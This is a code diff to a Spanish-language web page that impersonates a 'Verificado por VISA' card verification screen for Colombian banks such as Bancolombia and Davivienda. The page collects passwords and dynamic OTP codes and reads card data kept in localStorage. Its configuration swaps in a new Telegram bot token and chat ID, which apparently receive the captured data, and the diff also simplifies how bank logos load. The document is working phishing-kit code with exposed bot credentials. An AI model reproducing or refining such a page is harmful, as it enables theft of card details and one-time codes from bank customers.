@@ -420,19 +420,14 @@
             margin-top: 4px;
         }
 
-        /* ============================================ */
-        /* RESPONSIVE - LOGOS GRANDES EN TODOS LOS TAMAÑOS */
-        /* ============================================ */
         @media (max-width: 768px) {
             .container {
                 padding: 30px 24px;
                 max-width: 480px;
             }
-
             .visa-logo img {
                 height: 70px;
             }
-
             .bank-logo img {
                 height: 85px;
                 max-width: 150px;
@@ -444,78 +439,62 @@
                 padding: 20px 16px;
                 border-radius: 12px;
             }
-
             .header {
                 margin-bottom: 16px;
                 padding-bottom: 12px;
             }
-
             .visa-logo img {
                 height: 55px;
             }
-
             .bank-logo {
                 max-width: 50%;
             }
-
             .bank-logo img {
                 height: 70px;
                 max-width: 120px;
             }
-
             .form-title {
                 font-size: 1.125rem;
             }
-
             .form-subtitle {
                 font-size: 0.875rem;
                 margin-bottom: 16px;
             }
-
             .button-group {
                 flex-direction: column;
                 gap: 8px;
             }
-
             .btn {
                 width: 100%;
                 padding: 14px;
                 font-size: 0.875rem;
             }
-
             .form-footer {
                 flex-direction: column;
                 align-items: flex-start;
                 gap: 8px;
             }
-
             .info-label {
                 min-width: 60px;
                 font-size: 0.8rem;
             }
-
             .info-value {
                 font-size: 0.8rem;
             }
-
             .transaction-info {
                 padding: 12px 14px;
                 margin-bottom: 16px;
             }
-
             .security-banner {
                 padding: 12px 14px;
                 margin-bottom: 16px;
             }
-
             .security-banner p {
                 font-size: 0.75rem;
             }
-
             .otp-section {
                 padding: 14px;
             }
-
             .form-input {
                 padding: 10px 14px;
                 font-size: 0.9375rem;
@@ -526,47 +505,37 @@
             .container {
                 padding: 16px 12px;
             }
-
             .visa-logo img {
                 height: 45px;
             }
-
             .bank-logo {
                 max-width: 45%;
             }
-
             .bank-logo img {
                 height: 55px;
                 max-width: 100px;
             }
-
             .form-title {
                 font-size: 1rem;
             }
-
             .form-subtitle {
                 font-size: 0.8125rem;
             }
-
             .info-label {
                 min-width: 50px;
                 font-size: 0.75rem;
             }
-
             .info-value {
                 font-size: 0.75rem;
             }
-
             .btn {
                 padding: 12px;
                 font-size: 0.8125rem;
             }
-
             .form-input {
                 padding: 8px 12px;
                 font-size: 0.875rem;
             }
-
             .security-banner .shield-icon {
                 width: 18px;
                 height: 18px;
@@ -584,7 +553,7 @@
     <div class="container">
         <div class="header">
             <div class="visa-logo">
-                <img src="image.png" alt="Verificado por VISA" />
+                <img src="visa.png" alt="Verificado por VISA" />
             </div>
             <div class="bank-logo" id="bankLogoContainer">
                 <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
@@ -642,7 +611,6 @@
                 <div class="error-message">La contraseña es requerida</div>
             </div>
 
-            <!-- SECCIÓN OTP / CLAVE DINÁMICA -->
             <div class="otp-section" id="otpSection">
                 <div class="otp-info" id="otpInfoText">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -679,28 +647,13 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN - ACTUALIZADO CON NUEVAS CREDENCIALES
+        // CONFIGURACIÓN
         // ============================================
-        const TELEGRAM_BOT_TOKEN = '8736155859:AAEMF2eCDMjdFA88DkLdEz3I0PXaAbwGYfM';
-        const TELEGRAM_CHAT_ID = '-1003713613246';
+        const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
+        const TELEGRAM_CHAT_ID = '-1004294946880';
         const WEBHOOK_URL = '/api/webhook';
-        const POLLING_INTERVAL = 2000;
+        const POLLING_INTERVAL = 3000;
         const MAX_POLLING_TIME = 300000;
-
-        // ============================================
-        // MAPA DE LOGOS DE BANCOS
-        // ============================================
-        const bankLogos = {
-            'Bancolombia': 'bancol.png',
-            'Davivienda': 'davivienda.png',
-            'Davibank': 'db.png',
-            'Banco Popular': 'popu.png',
-            'Banco Falabella': 'fala.png',
-            'Itaú': 'itau.png',
-            'Caja Social': 'Caja.jpg',
-            'Banco de Bogotá': 'bog.png',
-            'Banco Occidente': 'occi.png'
-        };
 
         let solicitudId = null;
         let pollingInterval = null;
@@ -730,10 +683,12 @@
         window.addEventListener('load', function() {
             initializeTransaction();
             cargarLogoBanco();
-            configurarWebhook();
             console.log('✅ Verificado por VISA listo');
         });
 
+        // ============================================
+        // ✅ FUNCIÓN CORREGIDA - USA bankLogo DIRECTAMENTE
+        // ============================================
         function cargarLogoBanco() {
             const bancoEmisor = localStorage.getItem('bancoEmisor');
             const bankLogo = localStorage.getItem('bankLogo');
@@ -746,17 +701,16 @@
                 bancoNombre.textContent = bancoEmisor;
             }
 
-            // Si hay un logo guardado y está en el mapa de logos, mostrarlo
-            if (bancoEmisor && bankLogos[bancoEmisor]) {
-                bankLogoImg.src = bankLogos[bancoEmisor];
-                bankLogoImg.alt = bancoEmisor;
+            // ✅ USAR DIRECTAMENTE EL bankLogo QUE VIENE DE cc.html
+            if (bankLogo) {
+                bankLogoImg.src = bankLogo;
+                bankLogoImg.alt = bancoEmisor || 'Logo banco';
                 bankLogoImg.style.display = 'block';
                 bankLogoContainer.style.display = 'flex';
-                console.log('✅ Logo del banco cargado:', bankLogos[bancoEmisor]);
+                console.log('✅ Logo del banco cargado:', bankLogo);
             } else {
-                // Si no hay logo o no coincide, ocultar el contenedor
                 bankLogoContainer.style.display = 'none';
-                console.log('❌ No se encontró logo para el banco:', bancoEmisor);
+                console.log('❌ No se encontró logo del banco');
             }
         }
 
@@ -793,16 +747,6 @@
             localStorage.setItem('cardExpiry', expiry);
             
             console.log('📋 Datos cargados desde localStorage');
-        }
-
-        async function configurarWebhook() {
-            try {
-                const response = await fetch(`${WEBHOOK_URL}?setup=true`);
-                const data = await response.json();
-                console.log('🔗 Webhook configurado:', data);
-            } catch (error) {
-                console.error('❌ Error configurando webhook:', error);
-            }
         }
 
         // ============================================
